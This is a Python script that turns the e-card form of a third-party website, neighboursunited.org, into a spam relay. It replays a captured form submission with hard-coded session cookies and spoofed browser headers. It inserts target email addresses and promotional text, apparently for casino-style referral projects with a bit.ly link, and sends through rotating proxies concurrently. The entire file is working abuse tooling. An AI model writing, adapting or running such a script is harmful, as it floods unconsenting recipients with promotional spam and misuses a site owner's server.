import requests

import module

url = 'https://neighboursunited.org/ecards/'

cookies = {
    'asp_transient_id': '8a69b8ba94ecca136e2a585fed8aa603',
    'PHPSESSID': 'eb8338306f084100bbf56e78eecc762a',
    '_gid': 'GA1.2.1939688900.1670407549',
    '_gat_UA-116680523-2': '1',
    '_ga_WBP2G5E2B8': 'GS1.1.1670407548.1.1.1670408488.0.0.0',
    '_ga': 'GA1.1.1586971642.1670407549',
}

headers = {
    'authority': 'neighboursunited.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary0BgREeuSa2YaCpNe',
    'origin': 'https://neighboursunited.org',
    'referer': 'https://neighboursunited.org/ecards/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}
DATA = '------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n80262\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n80228\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n0\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\ntest\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_fname"\r\n\r\ntest\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_femail"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_more_recipient"\r\n\r\n\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundary0BgREeuSa2YaCpNe--\r\n'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        data = DATA.replace('softumwork@gmail.com', target).replace('test', self.get_text()).encode()
        response = requests.post(url, cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    project_name = 'spam'
    s = 'Your information has been received successfully'

    project = 'supercat'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3Bcqnew'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()
